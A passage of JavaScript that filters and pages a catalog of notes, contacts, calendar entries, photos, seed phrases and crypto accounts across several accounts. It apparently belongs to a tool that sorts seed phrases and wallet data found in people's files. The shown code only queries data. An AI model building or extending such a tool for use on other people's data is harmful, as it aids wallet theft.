    if (cryptoKind === "seed" && item.kind !== "seed") return false;
    if (cryptoKind === "image" && item.kind !== "photo" && item.kind !== "image") return false;
    if (cryptoKind === "file" && item.kind !== "file") return false;
    if (cryptoKind === "note" && item.kind !== "note") return false;
    if (!needle) return true;
    return isNeedle(
      [
        item.email,
        item.name,
        item.phrase,
        item.snippet,
        item.source,
        item.matched,
        item.signal,
        item.path,
      ].join(" "),
      needle
    );
  });
  const cryptoAccounts = (catalog.cryptoAccounts ?? []).filter(
    (row) => !accountId || row.accountId === accountId
  );
  counts.cryptoAccounts = cryptoAccounts.length;

  const totals = {
    notes: notes.length,
    contacts: contacts.length,
    calendar: calendar.length,
    photos: photos.length,
    seeds: seeds.length,
    crypto: crypto.length,
  };
  const common = { builtAt: catalog.builtAt, type, counts, totals, accounts: catalog.accounts };

  if (type === "all") {
    return {
      ...common,
      items: {
        notes: notes.slice(0, 12),
        contacts: contacts.slice(0, 12),
        calendar: calendar.slice(0, 12),
        photos: photos.slice(0, 24),
        seeds: seeds.slice(0, 12),
        crypto: crypto.slice(0, 12),
      },
      total: totals.notes + totals.contacts + totals.calendar + totals.photos + totals.seeds + totals.crypto,
      page: 1,
      pages: 1,
    };
  }
  if (type === "notes") return { ...common, ...pageOf(notes, page, Number(pageSize) || TEXT_PAGE) };
  if (type === "contacts") return { ...common, ...pageOf(contacts, page, Number(pageSize) || TEXT_PAGE) };
  if (type === "calendar") return { ...common, ...pageOf(calendar, page, Number(pageSize) || TEXT_PAGE) };
  if (type === "photos") return { ...common, ...pageOf(photos, page, Number(pageSize) || PHOTO_PAGE) };
  if (type === "seeds") {
    if (compact === "1") {
      return {
        ...common,
        items: [],
        lines: seeds.map(seedLabel).join("\n"),
        total: seeds.length,
        page: 1,
        pages: 1,
      };
    }
    return { ...common, ...pageOf(seeds, page, Number(pageSize) || TEXT_PAGE) };
  }
  if (type === "crypto") {
    return { ...common, summary: cryptoAccounts, ...pageOf(crypto, page, Number(pageSize) || PHOTO_PAGE) };
  }
  return { ...common, items: [], total: 0, page: 1, pages: 1 };
}
